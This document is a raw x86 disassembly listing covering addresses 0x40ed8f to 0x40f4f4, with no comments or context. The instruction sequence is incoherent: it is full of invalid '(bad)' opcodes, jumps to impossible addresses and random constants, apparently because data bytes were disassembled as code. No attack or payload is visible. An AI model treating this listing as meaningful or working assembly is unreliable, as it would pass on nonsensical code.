  40ed8f:	pop    ebx
  40ed90:	fiadd  WORD PTR [eax]
  40ed92:	add    BYTE PTR [eax],al
  40ed94:	add    BYTE PTR [eax],al
  40ed96:	inc    eax
  40ed97:	and    al,0xf
  40ed99:	jmp    0x4d5aa131
  40ed9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed9f:	jb     0x40edaf
  40eda1:	rcl    cl,cl
  40eda3:	sub    BYTE PTR [ebx+0x5],cl
  40eda6:	sub    ah,0x49
  40eda9:	jmp    0xe88b18e3
  40edae:	push   ecx
  40edaf:	outs   dx,BYTE PTR ds:[esi]
  40edb0:	or     DWORD PTR [ecx],edx
  40edb2:	push   ecx
  40edb3:	outs   dx,BYTE PTR ds:[esi]
  40edb4:	or     BYTE PTR [eax-0x50f18c08],dh
  40edba:	push   es
  40edbb:	stos   BYTE PTR es:[edi],al
  40edbc:	retf   
  40edbd:	sub    DWORD PTR [edx+ecx*2],0xf337e90d
  40edc4:	jp     0x40ed90
  40edc6:	adc    al,0xc8
  40edc8:	add    ah,BYTE PTR [edx+0x56]
  40edcb:	es inc edx
  40edcd:	call   0xeb76f20d
  40edd2:	xchg   ebx,eax
  40edd3:	sub    eax,0xcb86d4cf
  40edd8:	adc    al,bl
  40edda:	xchg   edx,eax
  40eddb:	mov    dl,0x8a
  40eddd:	sub    DWORD PTR [edi-0x51],ebp
  40ede0:	mov    ebx,0xe6aed4e8
  40ede5:	aas    
  40ede6:	dec    edx
  40ede7:	mov    dl,0xe
  40ede9:	lahf   
  40edea:	clc    
  40edeb:	sahf   
  40edec:	out    0xdb,al
  40edee:	push   ebx
  40edef:	mov    bl,0x50
  40edf1:	(bad)  
  40edf2:	dec    esi
  40edf3:	sub    esp,ecx
  40edf5:	ret    0xafd5
  40edf8:	push   cs
  40edf9:	mov    esp,0x0
  40edfe:	add    ah,al
  40ee00:	(bad)  
  40ee01:	pop    ebp
  40ee02:	mov    eax,0x835d64
  40ee07:	mov    ah,0xbb
  40ee09:	pop    eax
  40ee0a:	push   0x35
  40ee0c:	neg    BYTE PTR ss:[ebx-0x54]
  40ee10:	hlt    
  40ee11:	add    edx,DWORD PTR [eax-0x44]
  40ee14:	hlt    
  40ee15:	repz push eax
  40ee17:	ret    
  40ee18:	lods   eax,DWORD PTR ds:[esi]
  40ee19:	pop    eax
  40ee1a:	mov    esp,ecx
  40ee1c:	mov    edx,0x2f5957f0
  40ee21:	clc    
  40ee22:	add    DWORD PTR [edx+eiz*4-0x75],esp
  40ee26:	jge    0x40edf5
  40ee28:	lods   eax,DWORD PTR ds:[esi]
  40ee29:	jp     0x40ee39
  40ee2b:	cs shl ebx,0x8b
  40ee2f:	cs push esi
  40ee31:	jmp    0x40ee31
  40ee33:	cs dec ebx
  40ee35:	mov    eax,eax
  40ee37:	jne    0x40edca
  40ee39:	add    DWORD PTR [ebp-0x43],0x214582de
  40ee40:	fisub  WORD PTR [ebp+0x15]
  40ee43:	xchg   DWORD PTR ds:0xe30e0c52,esi
  40ee49:	dec    edi
  40ee4a:	test   ecx,edi
  40ee4c:	ror    DWORD PTR [eax],0x8b
  40ee4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee50:	inc    esi
  40ee51:	mov    dh,dh
  40ee53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee54:	or     BYTE PTR [eax+0x54ecce01],ah
  40ee5a:	leave  
  40ee5b:	mov    ebx,0xb931efae
  40ee60:	or     eax,0x80fb
  40ee65:	add    BYTE PTR [eax],al
  40ee67:	add    BYTE PTR [ebp-0x2e],cl
  40ee6a:	adc    al,BYTE PTR [eax]
  40ee6c:	sbb    ch,BYTE PTR [esp+edx*2]
  40ee6f:	and    al,0x49
  40ee71:	sbb    DWORD PTR [ecx+0x57],0x25
  40ee75:	(bad)  
  40ee76:	mov    bh,0x2
  40ee78:	cmc    
  40ee79:	std    
  40ee7a:	jnp    0x40ee81
  40ee7c:	loop   0x40ee25
  40ee7e:	push   ebx
  40ee7f:	jmp    0x40eecb
  40ee81:	sub    eax,0xb490647f
  40ee86:	clc    
  40ee87:	mov    dh,0x91
  40ee89:	pop    ss
  40ee8a:	inc    esp
  40ee8b:	jae    0x40ee1a
  40ee8d:	and    al,0xfa
  40ee8f:	push   edi
  40ee90:	cmp    ebx,DWORD PTR [ebp+0x14b07074]
  40ee96:	out    0x23,eax
  40ee98:	jo     0x40eeae
  40ee9a:	xlat   BYTE PTR ds:[ebx]
  40ee9b:	and    edi,DWORD PTR [eax-0x34]
  40ee9e:	xor    DWORD PTR [eax-0x72f948a4],ecx
  40eea4:	dec    esp
  40eea5:	mov    edi,0x7db8406
  40eeaa:	not    BYTE PTR [eax+0x60]
  40eead:	es mov al,0x23
  40eeb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eeb1:	retf   
  40eeb2:	mov    edi,0x5451e754
  40eeb7:	add    eax,0x54bfca40
  40eebc:	xlat   BYTE PTR ds:[ebx]
  40eebd:	jno    0x40ee4d
  40eebf:	mov    edi,0x4421e645
  40eec4:	ins    BYTE PTR es:[edi],dx
  40eec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec6:	fisttp WORD PTR [esi-0x41]
  40eec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeca:	fwait
  40eecb:	adc    DWORD PTR [eax],eax
  40eecd:	add    BYTE PTR [eax],al
  40eecf:	add    BYTE PTR [eax],al
  40eed1:	push   eax
  40eed2:	fwait
  40eed3:	mov    edi,?
  40eed5:	sub    ah,BYTE PTR [esi+0x58de0eaf]
  40eedb:	jb     0x40ef28
  40eedd:	je     0x40ef5a
  40eedf:	or     al,0x4c
  40eee1:	ins    BYTE PTR es:[edi],dx
  40eee2:	mov    bh,0xfd
  40eee4:	add    eax,ebx
  40eee6:	fist   DWORD PTR [esp+eax*1+0x78]
  40eeea:	ss mov ebx,0xb0129000
  40eef0:	and    esp,DWORD PTR [esi+ebx*1+0x1eb6734c]
  40eef7:	mov    eax,0x451f8423
  40eefc:	jae    0x40ee88
  40eefe:	jne    0x40ef0b
  40ef00:	push   ecx
  40ef01:	shl    BYTE PTR [edx-0x77b12f50],0x1c
  40ef08:	std    
  40ef09:	loopne 0x40ef0d
  40ef0b:	mov    cl,0xd0
  40ef0d:	mov    BYTE PTR ds:[ebx+ebp*2-0x70],ah
  40ef12:	es aam 0x7a
  40ef15:	fcmovnbe st,st(6)
  40ef17:	rcr    DWORD PTR [ebx-0x8],0x61
  40ef1b:	out    0x3,al
  40ef1d:	arpl   WORD PTR [edx-0x80],si
  40ef20:	lds    esi,FWORD PTR [ebp+ecx*1+0x369008a4]
  40ef27:	int3   
  40ef28:	lock xchg ebp,eax
  40ef2a:	cmp    eax,0xe59c2021
  40ef2f:	mov    bl,0x6d
  40ef31:	adc    esi,0x5
  40ef34:	jns    0x40ef36
  40ef36:	add    BYTE PTR [eax],al
  40ef38:	add    BYTE PTR [eax],al
  40ef3a:	xlat   BYTE PTR ds:[ebx]
  40ef3b:	pushf  
  40ef3c:	jmp    0xda174ab9
  40ef41:	js     0x40ef96
  40ef43:	(bad)  
  40ef44:	or     DWORD PTR [ebx-0x71],edi
  40ef47:	cmp    eax,0x9d7c2021
  40ef4c:	mov    eax,0x649e1acf
  40ef51:	pop    eax
  40ef52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef53:	add    eax,0xb0ad058e
  40ef58:	mov    BYTE PTR [edi+0x44],dh
  40ef5b:	call   0x5c9c:0xe4491e1b
  40ef62:	xchg   esi,eax
  40ef63:	mov    fs,esi
  40ef65:	add    eax,DWORD PTR ds:0x8ed45df7
  40ef6b:	(bad)  
  40ef6c:	gs adc dl,al
  40ef6f:	mov    dl,0x62
  40ef71:	inc    esp
  40ef72:	add    eax,ebp
  40ef74:	ins    BYTE PTR es:[edi],dx
  40ef75:	push   esp
  40ef76:	outs   dx,DWORD PTR ds:[esi]
  40ef77:	mov    WORD PTR [ebp+eiz*2+0x6e],cs
  40ef7b:	in     al,0x3e
  40ef7d:	cmc    
  40ef7e:	sbb    eax,0xdfa80e8c
  40ef83:	outs   dx,DWORD PTR ds:[esi]
  40ef84:	jmp    DWORD PTR [ebx-0x1c311e36]
  40ef8a:	ror    BYTE PTR [esp+edx*1],1
  40ef8d:	sub    DWORD PTR [ebp+0x4e2ac587],esi
  40ef93:	cmp    eax,0xbc2e69fd
  40ef98:	push   cs
  40ef99:	jge    0x40ef32
  40ef9b:	pop    es
  40ef9c:	cmp    al,0xfe
  40ef9e:	add    BYTE PTR [eax],al
  40efa0:	add    BYTE PTR [eax],al
  40efa2:	add    BYTE PTR [edx+0x30],bh
  40efa5:	pop    es
  40efa6:	jg     0x40ef28
  40efa8:	cmp    ecx,DWORD PTR [eax-0x1b]
  40efab:	cwde   
  40efac:	(bad)
  40efaf:	cmp    al,0x3d
  40efb1:	rcr    dh,0xe1
  40efb4:	mov    ebx,0xb7f61247
  40efb9:	jl     0x40ef77
  40efbb:	int3   
  40efbc:	cmp    al,0x40
  40efbe:	in     eax,dx
  40efbf:	dec    ebx
  40efc0:	mov    esi,0x3393e8be
  40efc5:	push   0x683393ed
  40efca:	loope  0x40ef5f
  40efcc:	adc    ah,cl
  40efce:	jb     0x40efd7
  40efd0:	aam    0xa
  40efd2:	xchg   ecx,eax
  40efd3:	cmp    DWORD PTR [eax+0xd],esp
  40efd6:	jmp    0x374fa32c
  40efdb:	cmp    DWORD PTR [edx-0x48128da9],esp
  40efe1:	sub    DWORD PTR [edi],0x6c1a3d90
  40efe7:	lahf   
  40efe8:	scas   eax,DWORD PTR es:[edi]
  40efe9:	out    dx,eax
  40efea:	jmp    0xe8e10f2a
  40efef:	xchg   ebx,eax
  40eff0:	ss into 
  40eff2:	aam    0x86
  40eff4:	xor    al,0xc6
  40eff6:	push   esi
  40eff7:	fadd   st,st(5)
  40eff9:	xor    DWORD PTR [edi+0x403c7b],0x7d
  40f000:	sub    cl,BYTE PTR [esp+0x75]
  40f004:	sub    al,0xc
  40f006:	xchg   ecx,eax
  40f007:	add    BYTE PTR [eax],al
  40f009:	add    BYTE PTR [eax],al
  40f00b:	add    dl,dh
  40f00d:	ins    DWORD PTR es:[edi],dx
  40f00e:	pop    es
  40f00f:	lea    esi,[ecx]
  40f011:	mov    ah,0x85
  40f013:	dec    esi
  40f014:	inc    ecx
  40f015:	jbe    0x40f068
  40f017:	ret    0xb32d
  40f01a:	pop    eax
  40f01b:	mov    ebx,DWORD PTR [eax+0x557e6f7e]
  40f021:	mov    bl,0x83
  40f023:	jl     0x40f082
  40f025:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f026:	jnp    0x40f033
  40f028:	mov    ds:0x3f8b0b6d,al
  40f02d:	push   ss
  40f02e:	cmp    al,0xb8
  40f030:	add    BYTE PTR es:[ebx],0x57
  40f034:	add    BYTE PTR [eax+ebp*8],0x51
  40f038:	stc    
  40f039:	mov    dl,0xe
  40f03b:	pop    edi
  40f03c:	xbegin 0x6bfff04d
  40f042:	test   BYTE PTR [ebp+ebx*4-0x3e],bh
  40f046:	xor    ecx,0xffffff92
  40f049:	xchg   esp,eax
  40f04a:	pop    es
  40f04b:	jae    0x40efd9
  40f04d:	ss jno 0x40f05c
  40f050:	jmp    0x429408db
  40f055:	repz test BYTE PTR [esi-0x53],al
  40f059:	aas    
  40f05a:	sbb    edi,edi
  40f05c:	(bad)  [edx]
  40f05e:	test   esi,ecx
  40f060:	push   es
  40f061:	push   0x70d24303
  40f066:	pop    es
  40f067:	jb     0x40f07d
  40f069:	outs   dx,DWORD PTR ds:[esi]
  40f06a:	pop    eax
  40f06b:	mov    esi,edi
  40f06d:	sbb    eax,0x57
  40f072:	add    BYTE PTR [eax],al
  40f074:	add    BYTE PTR [ecx-0x44a1b04e],ch
  40f07a:	mov    edx,0x802560e
  40f07f:	test   DWORD PTR [esi-0x70],ecx
  40f082:	lahf   
  40f083:	arpl   WORD PTR [edi+eiz*1-0x65],dx
  40f087:	or     eax,DWORD PTR [ebx-0x7cf4600a]
  40f08d:	out    dx,al
  40f08e:	mov    ds:0x11535e0b,eax
  40f093:	(bad)  
  40f094:	and    ecx,DWORD PTR [ebp+eax*2+0x20e7f080]
  40f09b:	mov    ch,0x3
  40f09d:	adc    eax,0xd68a89a0
  40f0a2:	xchg   ebx,eax
  40f0a3:	sahf   
  40f0a4:	add    edx,DWORD PTR [edx]
  40f0a6:	add    DWORD PTR [ecx+0x71],0x509e4b9b
  40f0ad:	mov    ebx,es
  40f0af:	enter  0x91af,0x9b
  40f0b3:	pusha  
  40f0b4:	add    DWORD PTR [edx-0x25],esp
  40f0b7:	xchg   BYTE PTR [edi+0x4d6caa84],bh
  40f0bd:	cwde   
  40f0be:	and    BYTE PTR [esi+0x979d107],dh
  40f0c4:	lea    eax,[esi-0x69]
  40f0c7:	arpl   WORD PTR [edi+0x5f0b9b3e],bx
  40f0cd:	inc    esi
  40f0ce:	pop    ecx
  40f0cf:	pop    es
  40f0d0:	add    BYTE PTR [ebx],cl
  40f0d2:	shl    BYTE PTR [esi],1
  40f0d4:	add    al,0x9b
  40f0d6:	retf   0x7302
  40f0d9:	add    BYTE PTR [eax],al
  40f0db:	add    BYTE PTR [eax],al
  40f0dd:	add    BYTE PTR [esi-0x2ef844de],bl
  40f0e3:	cmp    DWORD PTR [ecx],ecx
  40f0e5:	adc    ecx,0xffffff9f
  40f0e8:	arpl   WORD PTR [ebx-0x3df4651a],ax
  40f0ee:	xchg   esp,eax
  40f0ef:	fwait
  40f0f0:	mov    ch,bl
  40f0f2:	sbb    BYTE PTR [ecx-0x27ecfff5],0x26
  40f0f9:	add    al,0x97
  40f0fb:	enter  0x55b5,0xe7
  40f0ff:	mov    dl,0x7c
  40f101:	pop    ebp
  40f102:	sbb    bl,BYTE PTR [ebx+0x3e03f13]
  40f108:	int3   
  40f109:	or     edx,ebp
  40f10b:	mov    dh,0x52
  40f10d:	mov    bh,0xb3
  40f10f:	fidivr DWORD PTR [eax+edx*2+0x6f]
  40f113:	dec    ebx
  40f114:	mov    ecx,0x69399004
  40f119:	daa    
  40f11a:	pushf  
  40f11b:	mov    al,0xe5
  40f11d:	add    ebx,DWORD PTR ds:0xd7fbc1f6
  40f123:	cmp    DWORD PTR [eax],edi
  40f125:	imul   esi,edx,0xd
  40f128:	out    0x3,al
  40f12a:	or     esp,DWORD PTR [edx+0xaa3596a]
  40f130:	gs lahf 
  40f132:	jae    0x40f10a
  40f134:	jecxz  0x40f139
  40f136:	nop
  40f137:	mov    dl,0x71
  40f139:	sti    
  40f13a:	push   ss
  40f13b:	leavew 
  40f13d:	daa    
  40f13e:	xchg   edx,eax
  40f13f:	mov    dl,0xe5
  40f141:	pusha  
  40f142:	add    BYTE PTR [eax],al
  40f144:	add    BYTE PTR [eax],al
  40f146:	add    BYTE PTR [ebx-0x2a],al
  40f149:	sub    eax,0xd8b29006
  40f14e:	idiv   DWORD PTR [edi]
  40f150:	shl    DWORD PTR ds:0x31721504,0xc3
  40f157:	out    0x65,al
  40f159:	or     DWORD PTR [edx+edx*4],ebp
  40f15c:	mov    dl,0xe5
  40f15e:	mov    cs,WORD PTR [ebx-0x2a]
  40f161:	fucomp st(5)
  40f163:	nop
  40f164:	sbb    dh,ah
  40f166:	jmp    0x40f12f
  40f168:	lods   al,BYTE PTR ds:[esi]
  40f169:	in     eax,0x43
  40f16b:	mov    esi,0x91c7c165
  40f170:	mov    dl,0xe5
  40f172:	imul   esp,DWORD PTR [eax+0xc03e3d0],0x72
  40f179:	cli    
  40f17a:	add    BYTE PTR [edi-0x61a6f13a],bl
  40f180:	in     al,dx
  40f181:	push   cs
  40f182:	push   0xffffffec
  40f184:	sti    
  40f185:	jp     0x40f175
  40f187:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f188:	arpl   WORD PTR [esi],cx
  40f18a:	jmp    0x57451722
  40f18f:	int    0x2b
  40f191:	hlt    
  40f192:	lds    eax,FWORD PTR [eax-0xeb984d0]
  40f198:	lods   al,BYTE PTR ds:[esi]
  40f199:	cmp    esi,DWORD PTR [edi]
  40f19b:	psubb  mm5,QWORD PTR [edx]
  40f19e:	fucomp st(3)
  40f1a0:	popa   
  40f1a1:	sub    ebp,ebx
  40f1a3:	xchg   ebx,eax
  40f1a4:	aaa    
  40f1a5:	enter  0x51c6,0xf
  40f1a9:	push   esp
  40f1aa:	push   0x0
  40f1af:	add    al,cl
  40f1b1:	mov    ebx,0x7093e90c
  40f1b6:	sbb    ch,cl
  40f1b8:	in     al,0x5
  40f1ba:	test   BYTE PTR [eax],ah
  40f1bc:	jmp    0x8b04612a
  40f1c1:	mov    dl,0x3b
  40f1c3:	and    BYTE PTR [ebp+ecx*2+0x6993e87b],ah
  40f1ca:	out    0xea,al
  40f1cc:	xchg   ebx,eax
  40f1cd:	mov    dl,0xf7
  40f1cf:	enter  0xaa0c,0x83
  40f1d3:	mov    eax,0xd983799c
  40f1d8:	jnp    0x40f213
  40f1da:	jnp    0x40f1c4
  40f1dc:	xchg   ebx,eax
  40f1dd:	ffreep st(5)
  40f1df:	jmp    0xd4dc:0x410f1949
  40f1e6:	push   cs
  40f1e7:	jmp    0x399e6eb0
  40f1ec:	xor    al,0xe1
  40f1ee:	xor    edx,ebp
  40f1f0:	xchg   ebx,eax
  40f1f1:	scas   eax,DWORD PTR es:[edi]
  40f1f2:	or     esp,DWORD PTR [edx-0x39]
  40f1f5:	iret   
  40f1f6:	push   ds
  40f1f7:	cli    
  40f1f8:	in     al,0xaf
  40f1fa:	dec    edi
  40f1fb:	add    BYTE PTR [edi+0x37],ch
  40f1fe:	push   cs
  40f1ff:	mov    DWORD PTR [eax-0x46],edi
  40f202:	push   ebx
  40f203:	ret    0xafa5
  40f206:	add    DWORD PTR [ebp+edx*2-0x61],0x34
  40f20b:	inc    esp
  40f20c:	xchg   ebp,eax
  40f20d:	mov    esi,0xbd5b1177
  40f212:	add    DWORD PTR [eax+eax*1+0x0],0x0
  40f217:	add    BYTE PTR [eax],al
  40f219:	test   edx,eax
  40f21b:	xor    eax,DWORD PTR [ebp+edx*4-0x46]
  40f21f:	ja     0x40f226
  40f221:	push   0xffffffef
  40f223:	das    
  40f224:	jmp    0x40f291
  40f226:	(bad)  
  40f227:	into   
  40f228:	ret    0xaf39
  40f22b:	mov    ebp,esp
  40f22d:	xchg   ecx,eax
  40f22e:	cmp    ecx,DWORD PTR [ebx+0x24]
  40f231:	pop    ecx
  40f232:	pop    dx
  40f234:	push   esi
  40f235:	push   es
  40f236:	pop    edi
  40f237:	add    BYTE PTR [ebp+eax*2-0x25],0x5e
  40f23c:	(bad)  
  40f23d:	cmc    
  40f23e:	shl    BYTE PTR [esi],cl
  40f240:	push   eax
  40f241:	pushf  
  40f242:	jae    0x40f26f
  40f244:	and    al,0xf9
  40f246:	cmp    eax,0x17908bf5
  40f24b:	inc    esi
  40f24c:	and    eax,0xc08aaefb
  40f251:	(bad)  
  40f252:	xor    dl,BYTE PTR [eax]
  40f254:	add    ecx,ebp
  40f256:	scas   al,BYTE PTR es:[edi]
  40f257:	xor    DWORD PTR [edi-0x1b],0x37
  40f25b:	sbb    BYTE PTR [ebx],dh
  40f25d:	and    cl,ch
  40f25f:	jp     0x40f285
  40f261:	in     eax,dx
  40f262:	and    BYTE PTR [edi],0x77
  40f265:	test   ebp,0x80c1245a
  40f26b:	ud0    eax,DWORD PTR [ebp+0x38b12da]
  40f272:	or     edi,DWORD PTR [esp-0x43]
  40f276:	xor    eax,0xd99000ce
  40f27b:	data16 daa 
  40f27d:	add    BYTE PTR [eax],al
  40f27f:	add    BYTE PTR [eax],al
  40f281:	add    BYTE PTR [ebx],bl
  40f283:	push   ebx
  40f284:	cmc    
  40f285:	jg     0x40f214
  40f287:	cdq    
  40f288:	or     edx,DWORD PTR [eax+0x41]
  40f28b:	inc    ecx
  40f28c:	mov    esi,edi
  40f28e:	xchg   edi,eax
  40f28f:	and    esp,DWORD PTR [ecx+eax*1+0x1a]
  40f293:	pop    ebp
  40f294:	xchg   BYTE PTR [edi-0x5ae869],bh
  40f29a:	jg     0x40f238
  40f29c:	adc    dh,BYTE PTR [esp+ebp*4-0x49]
  40f2a0:	fsub   QWORD PTR [edi]
  40f2a2:	out    0x91,eax
  40f2a4:	adc    dl,BYTE PTR [esp+ebp*4-0x45]
  40f2a8:	fcomp  QWORD PTR [edi]
  40f2aa:	pop    edi
  40f2ab:	pusha  
  40f2ac:	daa    
  40f2ad:	and    al,0xb
  40f2af:	(bad)  
  40f2b0:	dec    edi
  40f2b1:	jae    0x40f327
  40f2b3:	scas   eax,DWORD PTR es:[edi]
  40f2b4:	mov    eax,eax
  40f2b6:	nop
  40f2b7:	pop    ebx
  40f2b8:	addr16 daa 
  40f2ba:	or     edx,edx
  40f2bc:	cmc    
  40f2bd:	jg     0x40f24c
  40f2bf:	fwait
  40f2c0:	or     edx,DWORD PTR [eax-0x3f]
  40f2c3:	mov    bl,0xc1
  40f2c5:	(bad)  
  40f2c6:	daa    
  40f2c7:	mov    cl,0x63
  40f2c9:	add    DWORD PTR [edx],ecx
  40f2cb:	fld    QWORD PTR [esi+0x13299cbf]
  40f2d1:	je     0x40f287
  40f2d3:	frstor [bx]
  40f2d6:	jg     0x40f271
  40f2d8:	adc    dl,BYTE PTR [esp+esi*4-0x3d]
  40f2dc:	fcomp  QWORD PTR [edi]
  40f2de:	test   DWORD PTR [edi],0x561b2c27
  40f2e4:	push   eax
  40f2e5:	jae    0x40f2e7
  40f2e7:	add    BYTE PTR [eax],al
  40f2e9:	add    BYTE PTR [eax],al
  40f2eb:	lods   al,BYTE PTR ds:[esi]
  40f2ec:	mov    edi,0xdb90c089
  40f2f1:	data16 daa 
  40f2f3:	or     ebx,DWORD PTR [edx-0xa]
  40f2f6:	jg     0x40f28d
  40f2f8:	fwait
  40f2f9:	or     edx,DWORD PTR [eax+0x61]
  40f2fc:	mov    dl,0x9d
  40f2fe:	clc    
  40f2ff:	mov    esi,0x916a90a9
  40f304:	cmp    al,0xa4
  40f306:	xchg   edi,ebp
  40f308:	push   ds
  40f309:	and    al,0x1d
  40f30b:	sbb    al,0xce
  40f30d:	mov    cl,0xd1
  40f30f:	je     0x40f332
  40f311:	call   0xb60f2f32
  40f316:	shr    DWORD PTR [ecx+ebp*4+0x33bc27f9],1
  40f31d:	and    eax,DWORD PTR [ebx]
  40f31f:	ror    BYTE PTR [esi-0x30fca0e3],1
  40f325:	adc    DWORD PTR [ebp+0x3ea3245],eax
  40f32b:	nop
  40f32c:	add    BYTE PTR [ebx+ebp*2+0x5e30a873],dl
  40f333:	or     DWORD PTR [edx-0x3a3cc59f],ecx
  40f339:	ins    BYTE PTR es:[edi],dx
  40f33a:	(bad)  
  40f33b:	jae    0x40f32b
  40f33d:	bound  eax,QWORD PTR [ebx-0x3d]
  40f340:	mov    cl,0x64
  40f342:	or     esi,DWORD PTR [edi]
  40f344:	xor    eax,0x622f07ad
  40f349:	out    0x6a,al
  40f34b:	pop    ebp
  40f34c:	aaa    
  40f34d:	mov    eax,ds:0x27
  40f352:	add    BYTE PTR [eax],al
  40f354:	add    BYTE PTR [edx],0x7d
  40f357:	dec    esi
  40f358:	das    
  40f359:	and    al,0xf8
  40f35b:	pop    ebp
  40f35c:	push   cs
  40f35d:	xor    eax,0xb24c2761
  40f362:	push   ecx
  40f363:	clc    
  40f364:	imul   edi,DWORD PTR [edx-0x414c379e],0xce635d35
  40f36e:	adc    DWORD PTR [ebp+0x7c],ebx
  40f371:	push   es
  40f372:	rol    bl,1
  40f374:	fbstp  TBYTE PTR [ebx]
  40f376:	test   eax,0xeee0510
  40f37b:	or     eax,0x195ef8c4
  40f380:	cld    
  40f381:	cmp    eax,ecx
  40f383:	xchg   ecx,eax
  40f384:	ror    ch,cl
  40f386:	or     al,0xe9
  40f388:	hlt    
  40f389:	push   es
  40f38a:	push   edx
  40f38b:	xor    dl,BYTE PTR [ecx]
  40f38d:	jne    0x40f3b5
  40f38f:	stos   DWORD PTR es:[edi],eax
  40f390:	xor    BYTE PTR [edx+0x32207259],0xe2
  40f397:	fst    QWORD PTR [ecx+0x461a0eb2]
  40f39d:	add    DWORD PTR [ebp+0x62],ebx
  40f3a0:	ret    
  40f3a1:	adc    DWORD PTR ss:[ecx-0x21],0x4851efa8
  40f3a9:	or     cl,BYTE PTR [edi]
  40f3ab:	jmp    0x57ca8bc8
  40f3b0:	xchg   ebp,eax
  40f3b1:	cs retf 0x93e9
  40f3b5:	mov    dl,0x3b
  40f3b7:	and    al,BYTE PTR [eax]
  40f3b9:	add    BYTE PTR [eax],al
  40f3bb:	add    BYTE PTR [eax],al
  40f3bd:	outs   dx,BYTE PTR ds:[esi]
  40f3be:	jmp    0x40f3d0
  40f3c0:	out    0x17,al
  40f3c2:	imul   ecx,DWORD PTR [esi],0xffffffe9
  40f3c5:	xchg   ebx,eax
  40f3c6:	xor    eax,DWORD PTR [ecx+0x25]
  40f3c9:	fnstsw WORD PTR [ebx+esi*8]
  40f3cc:	fs aad 0x1e
  40f3cf:	sbb    al,0x64
  40f3d1:	pop    ss
  40f3d2:	nop
  40f3d3:	icebp  
  40f3d4:	push   cs
  40f3d5:	(bad)
  40f3d8:	(bad)  
  40f3da:	les    ecx,FWORD PTR [esi-0x17]
  40f3dd:	push   cs
  40f3de:	push   0xaee82a83
  40f3e3:	mov    dh,0xe9
  40f3e5:	xchg   ebx,eax
  40f3e6:	mov    dl,0xc
  40f3e8:	cmp    edx,ebp
  40f3ea:	mov    ah,0x64
  40f3ec:	out    0xeb,al
  40f3ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3ef:	out    dx,eax
  40f3f0:	jmp    0xc1ca2ac8
  40f3f5:	inc    esi
  40f3f6:	test   al,0xef
  40f3f8:	add    BYTE PTR [ecx+0x37],bh
  40f3fb:	inc    edx
  40f3fc:	cld    
  40f3fd:	sar    DWORD PTR [ecx],0x2e
  40f400:	add    bh,BYTE PTR [ecx-0x788b50d1]
  40f406:	aaa    
  40f407:	dec    edx
  40f408:	hlt    
  40f409:	jns    0x40f43a
  40f40b:	lock jne 0x40f3e7
  40f40e:	cmp    bl,BYTE PTR [edx+0x8]
  40f411:	push   0x154d8263
  40f416:	sbb    al,0x28
  40f418:	(bad)  
  40f419:	push   ss
  40f41a:	pop    es
  40f41b:	mov    eax,es
  40f41d:	popf   
  40f41e:	pusha  
  40f41f:	mov    WORD PTR [ebp+0x0],?
  40f422:	add    BYTE PTR [eax],al
  40f424:	add    BYTE PTR [eax],al
  40f426:	or     eax,0xfa2b7b07
  40f42b:	mov    bh,dh
  40f42d:	call   FWORD PTR [eax+edx*8+0x5b]
  40f431:	push   ebx
  40f432:	in     al,0x70
  40f434:	sti    
  40f435:	push   eax
  40f436:	mov    BYTE PTR [eax-0x20a3000d],0x1e
  40f43d:	inc    eax
  40f43e:	imul   esi,DWORD PTR [eax],0x3839ebaf
  40f444:	dec    edx
  40f445:	hlt    
  40f446:	sub    DWORD PTR [ebx+0x3f],esp
  40f449:	lea    esp,[edi+eax*1]
  40f44c:	call   0xef241d5
  40f451:	test   BYTE PTR [ecx+0x7f],ch
  40f454:	sub    edi,edi
  40f456:	or     al,0x7
  40f458:	icebp  
  40f459:	adc    eax,0x2fa119
  40f45e:	stos   BYTE PTR es:[edi],al
  40f45f:	js     0x40f454
  40f461:	(bad)  
  40f462:	jmp    FWORD PTR [ebp-0x10]
  40f465:	adc    eax,0x2fa2c5
  40f46a:	ins    BYTE PTR es:[edi],dx
  40f46b:	repz jnp 0x40f477
  40f46e:	dec    edi
  40f46f:	lds    edx,FWORD PTR [eax]
  40f471:	(bad)  
  40f473:	lock call DWORD PTR [bx+si-0x6880]
  40f479:	add    BYTE PTR ds:0xdde756c6,dl
  40f47f:	mov    eax,0x5c0a0008
  40f484:	pop    edi
  40f485:	add    DWORD PTR [edx+0x5db359],eax
  40f48b:	add    BYTE PTR [eax],al
  40f48d:	add    BYTE PTR [eax],al
  40f48f:	imul   edx,DWORD PTR [edx+0x48],0xf
  40f493:	nop
  40f494:	sbb    al,0x67
  40f496:	or     esp,DWORD PTR [ebx-0x22]
  40f499:	mov    esp,0x2ecd1956
  40f49e:	adc    BYTE PTR [eax-0x60000448],bh
  40f4a4:	das    
  40f4a5:	fisub  WORD PTR [ebx]
  40f4a7:	ins    BYTE PTR es:[edi],dx
  40f4a8:	sbb    al,0xc7
  40f4aa:	and    ebp,DWORD PTR [eax-0x538cabe4]
  40f4b0:	outs   dx,DWORD PTR ds:[esi]
  40f4b1:	sbb    bl,bl
  40f4b3:	jmp    0xb1af:0xac538699
  40f4ba:	mov    ch,BYTE PTR [eax+0x11]
  40f4bd:	pop    eax
  40f4be:	mov    bh,BYTE PTR [ebx-0xc]
  40f4c1:	jmp    0x54dc8531
  40f4c6:	jae    0x40f474
  40f4c8:	mov    edx,DWORD PTR [esp+edx*1+0x40]
  40f4cc:	mov    cl,bl
  40f4ce:	call   FWORD PTR [edx]
  40f4d0:	inc    eax
  40f4d1:	movups xmm1,XMMWORD PTR [ecx]
  40f4d4:	jo     0x40f4e5
  40f4d6:	and    al,0xb
  40f4d8:	pop    edx
  40f4d9:	sub    ecx,DWORD PTR [ecx-0x7ad4882c]
  40f4df:	push   eax
  40f4e0:	adc    edi,ecx
  40f4e2:	and    edi,DWORD PTR [eax+0x27]
  40f4e5:	adc    eax,0x1287ca8b
  40f4ea:	add    DWORD PTR [edx+edx*2-0x7f820a72],eax
  40f4f1:	adc    bh,BYTE PTR [ecx+0x0]
  40f4f4:	add    BYTE PTR [eax],al
